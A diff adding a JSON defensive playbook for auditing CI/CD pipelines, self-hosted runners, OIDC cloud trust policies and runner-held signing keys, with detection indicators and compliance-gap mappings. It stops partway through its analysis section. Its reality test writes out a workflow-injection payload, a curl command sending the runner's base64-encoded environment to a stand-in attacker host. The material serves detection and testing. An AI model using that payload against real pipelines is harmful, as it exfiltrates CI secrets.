@@ -1,0 +1,970 @@
+{
+  "_meta": {
+    "id": "cicd-pipeline-compromise",
+    "version": "1.0.0",
+    "last_threat_review": "2026-05-17",
+    "threat_currency_score": 95,
+    "changelog": [
+      {
+        "version": "1.0.0",
+        "date": "2026-05-17",
+        "summary": "Initial seven-phase CI/CD pipeline + runner + OIDC + signing-key trust-boundary playbook. Distinct from sbom (package-registry supply chain): cicd covers the runner-fleet, the workflow YAML, the OIDC-to-cloud trust relationship, and the runner-scoped signing keys. Walks self-hosted runner registrations, workflow_dispatch + repository_dispatch trigger configuration, OIDC sub-claim patterns at the cloud trust-policy side, workflow-injection sinks (the exact class fixed in release.yml v0.12.39), and runner-scoped GPG / SSH / Sigstore key material. Closes the GRC loop with NIST SR-3 + SA-15 gaps, ISO A.8.30 + A.8.31 gaps, NIS2 Art.21(2)(j) software-development gap, SLSA L3 build-platform gap, and SOC 2 CC8.1 change-management gap.",
+        "cves_added": [
+          "CVE-2024-3094",
+          "CVE-2026-45321"
+        ],
+        "framework_gaps_updated": [
+          "nist-800-53-SR-3-runner-trust",
+          "nist-800-53-SA-15-build-platform",
+          "iso-27001-2022-A.8.30-build-pipeline",
+          "nis2-art21-2j-software-development",
+          "slsa-l3-build-platform",
+          "soc2-CC8.1-change-management"
+        ]
+      }
+    ],
+    "owner": "@blamejs/platform-security",
+    "air_gap_mode": false,
+    "scope": "service",
+    "preconditions": [
+      {
+        "id": "ci-config-readable",
+        "description": "Agent must be able to read the operator's CI configuration: .github/workflows/*.yml, .gitlab-ci.yml, Jenkinsfile, .circleci/config.yml, bitbucket-pipelines.yml, .buildkite/pipeline.yml, azure-pipelines.yml.",
+        "check": "agent_has_filesystem_read == true",
+        "on_fail": "halt"
+      },
+      {
+        "id": "operator-owns-ci-fleet",
+        "description": "The operator must own (or hold explicit written authorisation for) the CI provider organisation, self-hosted runner fleet, and connected cloud OIDC trust policies being inventoried.",
+        "check": "operator_ownership_attested == true",
+        "on_fail": "halt"
+      }
+    ],
+    "mutex": [],
+    "feeds_into": [
+      {
+        "playbook_id": "sbom",
+        "condition": "finding.includes_artifact_publish_risk == true"
+      },
+      {
+        "playbook_id": "cred-stores",
+        "condition": "finding.includes_oidc_or_token_leakage == true"
+      },
+      {
+        "playbook_id": "hardening",
+        "condition": "finding.includes_self_hosted_runner == true"
+      },
+      {
+        "playbook_id": "framework",
+        "condition": "analyze.compliance_theater_check.verdict == 'theater'"
+      }
+    ]
+  },
+  "domain": {
+    "name": "CI/CD pipeline + runner + OIDC + signing-key trust boundary",
+    "attack_class": "supply-chain",
+    "atlas_refs": [
+      "AML.T0010",
+      "AML.T0016"
+    ],
+    "attack_refs": [
+      "T1195.002",
+      "T1199",
+      "T1078.004",
+      "T1059",
+      "T1552.004",
+      "T1606.002"
+    ],
+    "cve_refs": [
+      "CVE-2024-3094",
+      "CVE-2026-45321"
+    ],
+    "cwe_refs": [
+      "CWE-77",
+      "CWE-78",
+      "CWE-88",
+      "CWE-94",
+      "CWE-426",
+      "CWE-345",
+      "CWE-1357"
+    ],
+    "d3fend_refs": [
+      "D3-EAL",
+      "D3-EHB",
+      "D3-CBAN",
+      "D3-IOPR"
+    ],
+    "frameworks_in_scope": [
+      "nist-800-53",
+      "iso-27001-2022",
+      "soc2",
+      "nis2",
+      "dora",
+      "uk-caf",
+      "au-ism",
+      "eu-cra",
+      "cmmc"
+    ]
+  },
+  "phases": {
+    "govern": {
+      "jurisdiction_obligations": [
+        {
+          "jurisdiction": "EU",
+          "regulation": "NIS2 Art.23",
+          "obligation": "notify_regulator",
+          "window_hours": 24,
+          "clock_starts": "detect_confirmed",
+          "evidence_required": [
+            "runner_fleet_inventory",
+            "compromised_artefact_assessment",
+            "oidc_trust_policy_dump"
+          ]
+        },
+        {
+          "jurisdiction": "EU",
+          "regulation": "DORA Art.19",
+          "obligation": "notify_regulator",
+          "window_hours": 4,
+          "clock_starts": "detect_confirmed",
+          "evidence_required": [
+            "ict_third_party_dependencies",
+            "containment_record"
+          ]
+        },
+        {
+          "jurisdiction": "EU",
+          "regulation": "EU CRA Art.14",
+          "obligation": "notify_regulator",
+          "window_hours": 24,
+          "clock_starts": "detect_confirmed",
+          "evidence_required": [
+            "actively_exploited_assessment",
+            "user_notification_draft"
+          ]
+        },
+        {
+          "jurisdiction": "US-Federal",
+          "regulation": "SEC Item 1.05 (8-K)",
+          "obligation": "notify_regulator",
+          "window_hours": 96,
+          "clock_starts": "analyze_complete",
+          "evidence_required": [
+            "material_impact_determination",
+            "incident_description"
+          ]
+        },
+        {
+          "jurisdiction": "AU",
+          "regulation": "APRA CPS 234",
+          "obligation": "notify_regulator",
+          "window_hours": 72,
+          "clock_starts": "validate_complete",
+          "evidence_required": [
+            "materiality_assessment",
+            "remediation_completed_evidence"
+          ]
+        }
+      ],
+      "theater_fingerprints": [
+        {
+          "pattern_id": "signed-commits-as-proof-of-build-integrity",
+          "claim": "Every release commit is GPG-signed by a developer, so the build pipeline produces trusted artefacts.",
+          "fast_detection_test": "Verify whether the SIGNING happens on the developer's machine (and the signed commit is the canonical artefact source) OR whether the runner re-signs after-the-fact with a runner-scoped key. Runner-scoped signing keys mean the runner — not the developer — is the trust root. A compromised runner forges signatures indistinguishable from the developer's. Read .github/workflows/*.yml for any `gpg --import` / `cosign sign` / `npm publish --provenance` that loads a key from a runner secret rather than a developer-side signature flow.",
+          "implicated_controls": [
+            "nist-800-53-SR-3",
+            "iso-27001-2022-A.8.30",
+            "slsa-l3-build-platform"
+          ]
+        },
+        {
+          "pattern_id": "branch-protection-as-supply-chain-defence",
+          "claim": "Branch protection requires PR review + status checks, therefore no malicious code can reach the build pipeline.",
+          "fast_detection_test": "Enumerate which workflows are reachable from fork PRs (`pull_request` trigger without `pull_request_target` distinction) and which run on `pull_request_target` with checkout of the PR head (the canonical workflow-injection foothold). Branch protection does not prevent a malicious PR-from-fork from EXECUTING in the operator's CI environment when the workflow naively trusts PR-supplied inputs."
+        },
+        {
+          "pattern_id": "oidc-as-secretless-therefore-safe",
+          "claim": "The pipeline uses OIDC-to-AWS / -GCP / -Azure with no long-lived secrets, so credential exposure is impossible.",
+          "fast_detection_test": "Examine the cloud-side trust policy. Common failures: (a) the `sub` claim is wildcarded across all repos in an org (`repo:myorg/*:*`) so any repo in the org assumes the role, (b) the trust policy allows ANY branch/PR (`:ref:refs/heads/*` or no ref pin) so a malicious PR run can assume the production role, (c) the `aud` claim is the default `sts.amazonaws.com` with no per-app discrimination. OIDC is no safer than the trust policy that consumes it."
+        }
+      ],
+      "framework_context": {
+        "gap_summary": "CI/CD pipelines, runners, OIDC trust relationships, and runner-scoped signing keys collectively form the most consequential supply-chain trust boundary, and most frameworks have not yet caught up. NIST 800-53 SR-3 (Supply Chain Controls and Processes) addresses procured-component supply chains but treats the operator's own build platform as out-of-scope. NIST 800-53 SA-15 (Development Process, Standards, and Tools) covers the development methodology but not the runner-fleet trust posture or the OIDC sub-claim discipline. ISO 27001 A.8.30 (Outsourced development) and A.8.31 (Separation of development, test, and operational environments) cover environment separation in principle but do not bind to OIDC trust-policy hygiene or workflow-injection prevention. NIS2 Art.21(2)(j) requires policies for software-development security but does not specify runner-fleet inventory, workflow-injection sink analysis, or per-environment OIDC sub-pinning. SLSA Level 3 build-platform requirements are the closest framework match but adoption is voluntary and not bound to any regulatory enforcement. SOC 2 CC8.1 change-management covers code-deploy change tracking but not the runner that performs the deploy. The result: a runner-fleet + workflow-injection sink + over-permissive OIDC trust policy + runner-scoped signing key together form a high-blast-radius compromise path that satisfies the literal language of every applicable control.",
+        "lag_score": 28,
+        "per_framework_gaps": [
+          {
+            "framework": "nist-800-53",
+            "control_id": "SR-3 — Supply Chain Controls and Processes",
+            "designed_for": "Protecting the organisation against supply-chain compromise of acquired components.",
+            "insufficient_because": "Treats the operator's own build platform as out-of-scope. A self-hosted runner compromise satisfies SR-3 trivially because the runner isn't a 'supplier' in the procurement sense, even though it has the same trust position as a compromised SDK."
+          },
+          {
+            "framework": "nist-800-53",
+            "control_id": "SA-15 — Development Process, Standards, and Tools",
+            "designed_for": "Establishing a documented development process that includes security tooling.",
+            "insufficient_because": "Covers methodology but not the runner-fleet trust posture (who can register a self-hosted runner? what isolation between job runs?) or the OIDC sub-claim discipline (does the trust policy pin per-repo, per-branch, per-environment?)."
+          },
+          {
+            "framework": "iso-27001-2022",
+            "control_id": "A.8.30 — Outsourced development",
+            "designed_for": "Outsourced-development risk management.",
+            "insufficient_because": "Does not bind to the operator's own build pipeline. Self-hosted runners and operator-owned workflow YAML are out of scope."
+          },
+          {
+            "framework": "iso-27001-2022",
+            "control_id": "A.8.31 — Separation of development, test, and operational environments",
+            "designed_for": "Logical/physical separation of dev/test/prod environments.",
+            "insufficient_because": "Does not extend to runner-fleet separation. A single self-hosted runner pool that processes both stage and prod workflows satisfies A.8.31 if the deployed environments are separate — but the runner that performs the deploy is itself the shared trust boundary."
+          },
+          {
+            "framework": "nis2",
+            "control_id": "Art.21(2)(j) — Policies and procedures for software development",
+            "designed_for": "Software-development security policies for essential and important entities.",
+            "insufficient_because": "Process-only; does not specify runner-fleet inventory, workflow-injection sink analysis, or per-environment OIDC sub-pinning. A pipeline with all three failure modes can satisfy the literal control."
+          },
+          {
+            "framework": "soc2",
+            "control_id": "CC8.1 — Change management",
+            "designed_for": "Code-deploy change tracking + approval.",
+            "insufficient_because": "Tracks the code change but not the runner that performs the deploy. A compromised runner forges the change record itself."
+          }
+        ]
+      },
+      "skill_preload": [
+        "supply-chain-integrity",
+        "exploit-scoring",
+        "framework-gap-analysis",
+        "compliance-theater",
+        "policy-exception-gen"
+      ]
+    },
+    "direct": {
+      "threat_context": "Q1-Q2 2026 CI/CD compromise landscape. The 2024 xz-utils backdoor (CVE-2024-3094) remains the canonical multi-year build-pipeline-trust compromise, where a maintainer-adjacent identity injected obfuscated code via the autotools layer that only the build produced — the source tree alone passed inspection. The March 2025 tj-actions/changed-files compromise (CVE-2025-30066 class) is the canonical mass GitHub Actions supply-chain incident: 20k+ repositories ran a compromised action that exfiltrated their CI secrets to a public URL within hours of the bad tag landing. Mini Shai-Hulud (CVE-2026-45321) showed the worm-via-GitHub-Actions class — a compromised npm package's postinstall script captures the runner's GITHUB_TOKEN + cloud-OIDC token, then uses them to publish more compromised packages from the operator's own pipeline. Self-hosted runner abuse remains operational: attacker-controlled forks open PRs against repositories with `pull_request_target` workflows, where the runner checks out the PR head and runs it inside the operator's CI environment with access to org secrets. Cloud OIDC trust policy weaknesses — wildcarded `sub` claims, missing branch / environment pins, default `aud` — turn the OIDC-to-cloud trust into a take-anything-from-the-org primitive. Runner-scoped signing keys (cosign keyless via OIDC, npm publish --provenance, GPG keys loaded from runner secrets) move the signing trust root onto the runner; a compromised runner forges signatures indistinguishable from a developer-signed release. v0.12.39 of this project fixed its own release.yml workflow-injection sink (the exact class) — this playbook codifies the detection pattern that finds the next one.",
+      "rwep_threshold": {
+        "escalate": 90,
+        "monitor": 70,
+        "close": 30
+      },
+      "framework_lag_declaration": "NIST 800-53 SR-3 + SA-15, ISO 27001 A.8.30 + A.8.31, NIS2 Art.21(2)(j), and SOC 2 CC8.1 collectively underspecify the build-platform trust boundary. None mandate self-hosted runner isolation between job runs, workflow-injection sink analysis, OIDC sub-claim pinning, or developer-side (not runner-side) signing-key custody. SLSA Level 3 is the closest match but adoption is voluntary and not enforced by any regulator. The xz-utils + tj-actions + Mini Shai-Hulud classes of compromise would all satisfy a literal reading of these controls. EU CRA Art.13 + Art.14 require software-product security including secure-development practices, but the runner-fleet posture is not explicitly named. UK CAF B5 (Resilient Networks & Systems) treats build infrastructure as part of the operational system but does not bind to per-runner ephemerality or workflow-injection prevention.",
+      "skill_chain": [
+        {
+          "skill": "supply-chain-integrity",
+          "purpose": "Score the build pipeline against SLSA Level 3 build-platform requirements; surface the gaps that map to operator-owned runner-fleet + workflow + OIDC trust posture.",
+          "required": true
+        },
+        {
+          "skill": "exploit-scoring",
+          "purpose": "Compute RWEP for each finding, weighting active-exploitation signals from the 2024-2026 CI compromise wave heavily.",
+          "required": true
+        },
+        {
+          "skill": "framework-gap-analysis",
+          "purpose": "Map each finding to the framework control that should have caught it and why it didn't.",
+          "required": true
+        },
+        {
+          "skill": "compliance-theater",
+          "purpose": "Run the theater test — does the org's claimed change-management or supply-chain posture actually catch a workflow-injection sink or a wildcarded OIDC sub claim?",
+          "required": true
+        },
+        {
+          "skill": "policy-exception-gen",
+          "purpose": "Generate auditor-ready exception language if a pipeline gap cannot be remediated within the jurisdiction's window.",
+          "skip_if": "close.exception_generation.trigger_condition == false",
+          "required": false
+        }
+      ],
+      "token_budget": {
+        "estimated_total": 17500,
+        "breakdown": {
+          "govern": 2200,
+          "direct": 1700,
+          "look": 1900,
+          "detect": 2400,
+          "analyze": 3800,
+          "validate": 3200,
+          "close": 2300
+        }
+      }
+    },
+    "look": {
+      "artifacts": [
+        {
+          "id": "workflow-yaml-inventory",
+          "type": "config_file",
+          "source": "Repository walk for .github/workflows/*.yml + .gitlab-ci.yml + Jenkinsfile + .circleci/config.yml + bitbucket-pipelines.yml + .buildkite/pipeline.yml + azure-pipelines.yml + reusable workflow files referenced via `uses:` from any of the above.",
+          "description": "Every workflow definition the operator owns, parsed for triggers, jobs, runner-targeting, steps, and `${{ ... }}` expression usage.",
+          "required": true,
+          "air_gap_alternative": "Local repository walk only; if the workflow references a `uses:` from a private organisation that isn't checked out locally, mark that reusable workflow as inventory_gap=reusable_workflow_unfetched."
+        },
+        {
+          "id": "self-hosted-runner-registrations",
+          "type": "api_response",
+          "source": "gh api /repos/{owner}/{repo}/actions/runners + gh api /orgs/{org}/actions/runners + gh api /enterprises/{ent}/actions/runners (GitHub). For GitLab: GET /projects/:id/runners + /groups/:id/runners + /admin/runners. For BuildKite/CircleCI: provider-specific runner registration list.",
+          "description": "All self-hosted runners registered to the operator's CI provider, with their labels, status, and which workflows can target them.",
+          "required": false,
+          "air_gap_alternative": "If CI provider APIs are unreachable, fall back to local-host runner agent process inventory (presence of `actions-runner` / `Runner.Listener` / `gitlab-runner` daemons) on operator-controlled hosts; mark cloud-runner inventory as inventory_gap=admin_api_unavailable."
+        },
+        {
+          "id": "oidc-trust-policy-inventory",
+          "type": "config_file",
+          "source": "AWS: iam:GetRole + iam:GetOpenIDConnectProvider for every role that names token.actions.githubusercontent.com or gitlab-oidc-token-issuer. GCP: workload-identity-federation pool + provider configuration + service-account IAM bindings. Azure: federated credentials on the app registration. Terraform / Pulumi source: grep `aws_iam_role` + `condition` blocks naming `token.actions.githubusercontent.com:sub`.",
+          "description": "Cloud-side trust policies that accept OIDC tokens from the CI provider, with their `sub`, `aud`, `iss` claim conditions.",
+          "required": true,
+          "air_gap_alternative": "Terraform / Pulumi source only; mark live-cloud trust-policy state as inventory_gap=cloud_api_unavailable."
+        },
+        {
+          "id": "runner-secrets-inventory",
+          "type": "api_response",
+          "source": "gh secret list --json (repo + org + environment scopes), gh variable list, plus the workflow YAML's `secrets:` block and `env:` block. Cross-check against GitLab CI/CD variables (GET /projects/:id/variables) and BuildKite team secrets.",
+          "description": "Secrets reachable from the runner, partitioned by scope (repo / env / org). Used to map blast radius of a runner compromise.",
+          "required": false,
+          "air_gap_alternative": "Workflow YAML's secret references only; mark provider-side secret inventory as inventory_gap=secret_admin_api_unavailable."
+        },
+        {
+          "id": "signing-key-locations",
+          "type": "config_file",
+          "source": "Grep workflow YAML for: `gpg --import`, `cosign sign`, `cosign import-key-pair`, `npm publish --provenance`, `sigstore-python`, `slsa-github-generator`, `terraform-registry-publish-key`. Capture where the private key comes from — runner secret, vault fetch, or developer-side signed artefact.",
+          "description": "Where each release signing key lives. Distinguishes developer-custody (signed before the runner) from runner-custody (signed by the runner).",
+          "required": false
+        },
+        {
+          "id": "fork-pr-workflow-exposure",
+          "type": "config_file",
+          "source": "For each workflow file, evaluate: trigger = `pull_request_target`? + step = `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` or `ref: ${{ github.head_ref }}`? + step references `${{ github.event.pull_request.title }}` / `${{ github.head_ref }}` / `${{ github.event.pull_request.body }}` as a shell argument or `script:` body without strict-quoting / env-pin? Each pattern is a separately-flagged workflow-injection sink.",
+          "description": "Workflow-injection sinks that combine fork-PR trigger + PR-supplied checkout + unsafe expression interpolation.",
+          "required": false
+        },
+        {
+          "id": "actions-sha-pinning",
+          "type": "config_file",
+          "source": "For each `uses:` reference in the workflow YAML, classify the version pin: 40-char SHA, semver tag, branch, or floating `@main`. Anything other than SHA is a risk surface.",
+          "description": "Third-party Action pin discipline. Tag-pinned actions are mutable; only SHA-pin is immutable.",
+          "required": false
+        }
+      ],
+      "collection_scope": {
+        "time_window": "current",
+        "asset_scope": "operator_owned_ci_org_and_runners_and_cloud_trust_policies",
+        "depth": "deep",
+        "sampling": "full workflow tree + full runner fleet + full OIDC trust policy enumeration. Re-collect on every new runner registration or workflow change."
+      },
+      "environment_assumptions": [
+        {
+          "assumption": "operator owns the CI organisation, runner fleet, and connected cloud OIDC trust policies",
+          "if_false": "Halt with authorisation_required."
+        },
+        {
+          "assumption": "repository tree is readable",
+          "if_false": "Mark workflow-yaml-inventory + fork-pr-workflow-exposure as inventory_gap=no_repo_access and halt — workflow inspection is load-bearing."
+        },
+        {
+          "assumption": "CI provider admin API token is configured",
+          "if_false": "self-hosted-runner-registrations + runner-secrets-inventory fall back to local sources; downgrade overall confidence to medium."
+        },
+        {
+          "assumption": "cloud provider admin API access is configured for the OIDC trust-consuming accounts",
+          "if_false": "oidc-trust-policy-inventory falls back to Terraform / Pulumi source; mark live-cloud trust-policy state as inventory_gap=cloud_api_unavailable."
+        }
+      ],
+      "fallback_if_unavailable": [
+        {
+          "artifact_id": "self-hosted-runner-registrations",
+          "fallback_action": "use_compensating_artifact",
+          "confidence_impact": "medium"
+        },
+        {
+          "artifact_id": "oidc-trust-policy-inventory",
+          "fallback_action": "use_compensating_artifact",
+          "confidence_impact": "high"
+        },
+        {
+          "artifact_id": "runner-secrets-inventory",
+          "fallback_action": "mark_inconclusive",
+          "confidence_impact": "medium"
+        },
+        {
+          "artifact_id": "workflow-yaml-inventory",
+          "fallback_action": "escalate_to_human",
+          "confidence_impact": "high"
+        }
+      ]
+    },
+    "detect": {
+      "indicators": [
+        {
+          "id": "workflow-injection-sink",
+          "type": "log_pattern",
+          "value": "Workflow trigger contains `pull_request_target` OR `issue_comment` AND a step references `${{ github.event.pull_request.title }}`, `${{ github.event.pull_request.body }}`, `${{ github.event.issue.title }}`, `${{ github.event.comment.body }}`, `${{ github.head_ref }}` directly inside a `run:` shell body or `script:` block without env-pinning.",
+          "description": "Canonical GitHub Actions script-injection sink. v0.12.39 fixed this class in this repo's release.yml. Attacker-controlled fork PR title becomes shell code on the runner.",
+          "confidence": "deterministic",
+          "deterministic": true,
+          "attack_ref": "T1059",
+          "false_positive_checks_required": [
+            "Confirm the reference IS in shell/script position. The same expression interpolated into `with:` inputs of a trusted action that itself validates its inputs is lower-severity. The sink-grade pattern is specifically `run: echo ${{ github.event.pull_request.title }}` or equivalent inside a shell context.",
+            "Confirm the workflow runs on a privileged runner with access to org secrets. A workflow that only sets a label using GITHUB_TOKEN with read-only contents permission is lower-blast-radius than the same sink on a runner with write+packages+id-token permissions."
+          ]
+        },
+        {
+          "id": "pull-request-target-with-pr-checkout",
+          "type": "log_pattern",
+          "value": "Workflow trigger is `pull_request_target` AND a step is `actions/checkout` with `ref: ${{ github.event.pull_request.head.sha }}` or `ref: ${{ github.head_ref }}`.",
+          "description": "Self-hosted runner attacker-controlled fork PR class. The runner executes attacker-supplied code with operator-tier secrets in scope.",
+          "confidence": "deterministic",
+          "deterministic": true,
+          "attack_ref": "T1199",
+          "false_positive_checks_required": [
+            "Confirm the workflow does NOT have a preceding `if: github.event.pull_request.author_association == 'OWNER' || ... == 'MEMBER' || ... == 'COLLABORATOR'` gate. Trusted-author gates downgrade to medium (still finding because the gate is bypassable via repo-permission elevation).",
+            "Confirm the runner is self-hosted OR has access to a non-trivial secret. A GitHub-hosted runner running with only the default GITHUB_TOKEN at read scope is lower-blast-radius."
+          ]
+        },
+        {
+          "id": "wildcarded-oidc-sub-claim",
+          "type": "log_pattern",
+          "value": "Cloud trust policy condition `token.actions.githubusercontent.com:sub` (or equivalent) is `repo:<org>/*:*`, `repo:*:*`, missing entirely, or otherwise wildcards across repos or branches the role grants access to.",
+          "description": "OIDC sub-claim wildcarded across repos or branches = any repo / any branch in scope can assume the cloud role.",
+          "confidence": "deterministic",
+          "deterministic": true,
+          "attack_ref": "T1078.004",
+          "false_positive_checks_required": [
+            "Confirm the role's actual permissions are scoped to the operations the wildcard repos legitimately need. A wildcarded sub on a role with `s3:GetObject` against a public-data bucket is lower-blast-radius than the same wildcard on a role with `iam:*` or `s3:DeleteObject`.",
+            "Confirm there is NOT a complementary `condition` block pinning `aud`, `repository_owner`, or `environment` that effectively narrows the trust. The combined conditions form the real trust surface; evaluate them together."
+          ]
+        },
+        {
+          "id": "actions-floating-tag-pin",
+          "type": "log_pattern",
+          "value": "Workflow `uses:` reference resolves to a tag or branch rather than a 40-char SHA: `actions/checkout@v4`, `tj-actions/changed-files@v44`, `org/action@main`.",
+          "description": "Tag-pinned third-party Actions are mutable. The 2025 tj-actions/changed-files compromise propagated via tag-repointing.",
+          "confidence": "high",
+          "deterministic": false,
+          "attack_ref": "T1195.002",
+          "false_positive_checks_required": [
+            "Confirm the action is GitHub-owned (`actions/*`) AND the workflow runs in a context that wouldn't grant secret-access on a compromised action. GitHub-owned tag pins are lower-risk than third-party tag pins but not zero-risk; for high-privilege workflows, demand SHA pinning regardless.",
+            "Confirm Dependabot or Renovate is configured to keep the SHA pin current. SHA pinning without a maintenance bot drifts into stale-vulnerable-action territory; both pin discipline AND maintenance bot need to be present."
+          ]
+        },
+        {
+          "id": "runner-scoped-signing-key",
+          "type": "log_pattern",
+          "value": "Workflow loads a private signing key from a runner secret (`gpg --import <<< \"${{ secrets.GPG_PRIVATE_KEY }}\"`, `cosign import-key-pair --key=<vault-secret>`, `echo ${{ secrets.NPM_TOKEN }} > .npmrc`) AND uses it to sign or publish a release.",
+          "description": "Runner-scoped signing keys move the trust root onto the runner. A compromised runner forges signatures indistinguishable from a developer-signed release.",
+          "confidence": "deterministic",
+          "deterministic": true,
+          "attack_ref": "T1552.004",
+          "false_positive_checks_required": [
+            "Confirm the signing path does NOT have a complementary developer-side signature (e.g. a signed commit by a trusted developer that the workflow VERIFIES before re-signing). When both signatures are present and required, the runner-key is acting as a registry-side proof, not the trust root.",
+            "Confirm keyless signing via OIDC (cosign keyless, sigstore-python) is in use rather than a stored private key. Keyless signing via short-lived OIDC certificates is preferred; if so, demote — the trust root is the OIDC sub claim (separately checked by wildcarded-oidc-sub-claim)."
+          ]
+        },
+        {
+          "id": "self-hosted-runner-non-ephemeral",
+          "type": "log_pattern",
+          "value": "Self-hosted runner registration shows the runner accepts jobs from public repos (or all-org repos) AND the runner is not configured as `ephemeral: true` (GitHub) / not running with `--once` (GitLab).",
+          "description": "Non-ephemeral self-hosted runner exposes job-to-job state. A malicious fork PR leaves payloads that the next legitimate job runs against.",
+          "confidence": "deterministic",
+          "deterministic": true,
+          "attack_ref": "T1199",
+          "false_positive_checks_required": [
+            "Confirm the runner pool actually accepts fork-PR triggers (some orgs restrict self-hosted runner usage to internal repos only). If the runner is configured to refuse jobs from forks, the fork-PR escalation path is closed; demote to medium.",
+            "Confirm the runner does NOT run inside a fresh-per-job container or VM. Ephemerality at the orchestrator layer (k8s pod-per-job, Vagrant snapshot rollback) achieves the same property as `ephemeral: true`."
+          ]
+        },
+        {
+          "id": "secret-exposed-to-fork-pr",
+          "type": "log_pattern",
+          "value": "Workflow trigger includes `pull_request` from forks AND a step references `${{ secrets.* }}` other than the default `GITHUB_TOKEN`.",
+          "description": "Org or repo secrets in scope of a fork-PR workflow = direct exfiltration vector. By default GitHub gates this, but workflow-level overrides or environment misconfiguration re-opens the path.",
+          "confidence": "deterministic",
+          "deterministic": true,
+          "attack_ref": "T1552.004",
+          "false_positive_checks_required": [
+            "Confirm the workflow does NOT have a `permissions:` block restricting GITHUB_TOKEN scopes AND does NOT have an `environment:` gate with a manual approval. Either narrows the blast radius; both narrows it substantially.",
+            "Confirm the secret is genuinely sensitive. A SENTRY_DSN that is already public-by-design is a finding-of-hygiene, not a finding-of-leakage."
+          ]
+        }
+      ],
+      "false_positive_profile": [
+        {
+          "indicator_id": "workflow-injection-sink",
+          "benign_pattern": "Expression is wrapped in single-quoted env-pin: `env: PR_TITLE: ${{ github.event.pull_request.title }}` then `run: echo \"$PR_TITLE\"`.",
+          "distinguishing_test": "The canonical safe pattern interpolates the expression into an env var THEN references the env var inside the shell. If the expression is the env-var rvalue (not directly interpolated into shell), the injection sink is closed. Verify by reading the immediate context of the expression — is it on the right of an `env:` assignment, or inside the run/script body?"
+        },
+        {
+          "indicator_id": "wildcarded-oidc-sub-claim",
+          "benign_pattern": "Org-wide trust intentional for an org-owned ephemeral-environment role with limited cloud permissions.",
+          "distinguishing_test": "Cross-check the cloud-role's actual policy. A wildcarded sub on a role with cloudwatch:PutMetricData is much lower-risk than the same wildcard on a role that has any write-to-prod permission. Score by the (sub-wildcard × role-permission) product, not by the wildcard alone."
+        }
+      ],
+      "minimum_signal": {
+        "detected": "At least one deterministic indicator fires AND artefact inventory was successfully collected. workflow-injection-sink OR pull-request-target-with-pr-checkout OR wildcarded-oidc-sub-claim OR runner-scoped-signing-key OR secret-exposed-to-fork-pr — any single fire counts.",
+        "inconclusive": "workflow-yaml-inventory complete but every potential indicator's false_positive_checks_required step was blocked (cloud API unreachable, CI admin API unreachable). Cannot deny without resolving inventory gaps.",
+        "not_detected": "All inventory complete, no deterministic indicator fires, action pins are SHA-pinned with maintenance-bot coverage, OIDC trust policies pin per-repo + per-branch, self-hosted runners are ephemeral, fork-PR workflows do not have access to non-default secrets, and no runner-scoped signing keys are in use."
+      }
+    },
+    "analyze": {
+      "rwep_inputs": [
+        {
+          "signal_id": "workflow-injection-sink",
+          "rwep_factor": "active_exploitation",
+          "weight": 25,
+          "notes": "Workflow injection is routinely exploited in disclosed CI compromises and bug-bounty reports."
+        },
+        {
+          "signal_id": "workflow-injection-sink",
+          "rwep_factor": "public_poc",
+          "weight": 15,
+          "notes": "Well-documented public PoCs across security-research blogs."
+        },
+        {
+          "signal_id": "pull-request-target-with-pr-checkout",
+          "rwep_factor": "active_exploitation",
+          "weight": 25,
+          "notes": "Self-hosted runner fork-PR escape is operational in observed intrusions."
+        },
+        {
+          "signal_id": "wildcarded-oidc-sub-claim",
+          "rwep_factor": "public_poc",
+          "weight": 15,
+          "notes": "Trust-policy weakness exploitation is well-documented in cloud-security research."
+        },
+        {
+          "signal_id": "actions-floating-tag-pin",
+          "rwep_factor": "active_exploitation",
+          "weight": 25,
+          "notes": "tj-actions/changed-files class compromise in March 2025 — tag-repointing as the active vector."
+        },
+        {
+          "signal_id": "runner-scoped-signing-key",
+          "rwep_factor": "blast_radius",
+          "weight": 5,
+          "notes": "Runner-scoped signing increases blast radius — compromise forges trusted releases."
+        },
+        {
+          "signal_id": "secret-exposed-to-fork-pr",
+          "rwep_factor": "ai_weaponization",
+          "weight": 10,
+          "notes": "AI-assisted reconnaissance of public workflow YAML for fork-PR-exposed-secret patterns is operational."
+        },
+        {
+          "signal_id": "self-hosted-runner-non-ephemeral",
+          "rwep_factor": "blast_radius",
+          "weight": 5,
+          "notes": "Non-ephemeral runners amplify any other indicator's blast radius."
+        }
+      ],
+      "blast_radius_model": {
+        "scope_question": "If a CI/CD pipeline compromise indicator is exploited, what scope of downstream compromise does the runner / OIDC trust / signing-key deliver?",
+        "scoring_rubric": [
+          {
+            "condition": "Workflow runs only on ephemeral GitHub-hosted runners with read-only GITHUB_TOKEN and no `secrets.*` references.",
+            "blast_radius_score": 1,
+            "description": "Limited to the workflow's own output. Cleanup = revert the workflow change, audit-log review."
+          },
+          {
+            "condition": "Workflow has access to repo-scoped secrets but no cloud OIDC or signing-key access.",
+            "blast_radius_score": 2,
+            "description": "Repo-secret exfiltration + lateral-movement via leaked tokens."
+          },
+          {
+            "condition": "Workflow has access to cloud OIDC role with read+modify permission on a non-prod resource.",
+            "blast_radius_score": 3,
+            "description": "Cloud-resource compromise scoped to one environment."
+          },
+          {
+            "condition": "Workflow has access to artefact-publish role (npm publish, container registry push, terraform apply on prod IaC).",
+            "blast_radius_score": 4,
+            "description": "Supply-chain compromise — published artefact poisons every downstream consumer."
+          },
+          {
+            "condition": "Workflow has access to a release-signing key OR an OIDC role with org-admin / cloud-org-management permission.",
+            "blast_radius_score": 5,
+            "description": "Identity / signing-root compromise. Forges signatures or pivots org-wide."
+          }
+        ]
+      },
+      "compliance_theater_check": {
+        "claim": "Pipeline supply-chain is managed under SR-3 / SA-15 / A.8.30 / SOC 2 CC8.1 — every release is signed, every dependency reviewed, every change tracked.",
+        "audit_evidence": "Signed release artefacts, dependency-review reports, change-tracking tickets, SBOM attestations.",
+        "reality_test": "For a sample workflow: (a) submit a fork PR with a deliberately-crafted title containing a shell metacharacter sequence (e.g. `;curl attacker.example/$(env | base64)`) and confirm the workflow does NOT execute it; (b) inspect the cloud trust policy for any `sub` claim wider than `repo:<org>/<repo>:ref:refs/heads/main` for the production role; (c) confirm release signing happens on a developer-side key the runner only USES the signature of, not on a runner-loaded private key. Theater verdict if any of (a)-(c) fails: paper compliance is satisfied while the pipeline is exploitable.",
